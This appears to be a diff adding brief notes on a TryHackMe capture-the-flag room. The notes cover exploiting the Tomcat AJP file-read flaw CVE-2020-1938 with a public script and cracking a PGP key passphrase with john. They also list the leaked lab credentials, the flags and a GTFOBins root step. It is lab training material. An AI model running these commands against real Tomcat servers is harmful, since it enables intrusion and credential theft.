@@ -1,0 +1,48 @@
+vulnerable service(actually ghostcat is the exploit name same as the title)
+==================
+Apache Tomcat 9.0.30 = CVE-2020-1938
+https://blog.qualys.com/technology/2020/03/10/detect-apache-tomcat-ajp-file-inclusion-vulnerability-cve-2020-1938-using-qualys-was
+
+read web.xml configuration and got interesting info
+
+script=>python 48143.py 10.10.6.64 -p 8009 -f 'WEB-INF/web.xml'
+
+<description>
+     Welcome to GhostCat
+        skyfuck:8730281lkjlkjdqlksalks
+  </description>
+
+
+ssh creds
+=========
+skyfuck:8730281lkjlkjdqlksalks
+
+-user flag in /home/merlin
+THM{GhostCat_1s_so_cr4sy}
+
+skyfuck file interesting
+========================
+-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10 22:09 credential.pgp
+-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10 22:10 tryhackme.asc
+
+got credentials from tryhackme.asc
+==================================
+cmds
+----
+sudo gpg2john tryhackme.asc > hash
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+alexandru        (tryhackme)
+
+decrypt pgp file with the password
+==================================
+gpg --import tryhackme.asc 
+gpp --output ./decryptMsg --decrypt credential.pgp 
+
+file gotten
+-----------
+merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
+
+for root -> GTFOBins 
+===================
+rootFlag => THM{Z1P_1S_FAKE}
